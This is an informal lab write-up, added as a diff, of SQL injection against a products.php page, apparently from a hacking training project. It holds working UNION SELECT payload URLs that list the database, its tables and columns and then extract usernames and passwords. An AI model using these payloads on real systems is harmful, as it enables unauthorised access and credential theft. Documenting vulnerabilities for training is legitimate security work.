@@ -1,0 +1,20 @@
+SQL  INJECTION TYPE 1
+1 .When we  apply single quote in house parameter: products.php?cat=1’ and we get complete MySQL error
+
+2.when we remove the payload * ' * and the error is removed confirming SQL injection
+ 3. and these injection even possible in all the cat=2 ,cat =3
+
+AND NOW ANOTHER INJECTION FOR DISPLAYING THE DATABASE DIRECTORIES NAMES 
+
+1.http://35.154.19.199/products.php?cat=2' union select database(),database(),database(),database(),database(),database(),database()--+
+         THESE DISPALYS THE THE DATABASE NAME NAMED "hacking_training_project" which can be further exploited
+
+  http://35.154.19.199/products.php?cat=2' union select 1, table_name, 3,4,5,6,7 from information_schema.tables where table_schema="hacking_training_project"--+
+           THESE DIPLAYS THE TABLES INSIDE THE "hacking_training_project" DIRECTORY.
+
+
+  http://35.154.19.199/products.php?cat=2' union select 1, COLUMN_name, 3,4,5,6,7 from information_schema.COLUMNS where table_schema="hacking_training_project"--+
+           THESE DISPLAYS THE ALL THE COLUMNS PRESENT 
+
+  http://35.154.19.199/products.php?cat=2' UNION SELECT 1,user_name,3,password,5,6,7 FROM users --+
+   will display the username and passwords.
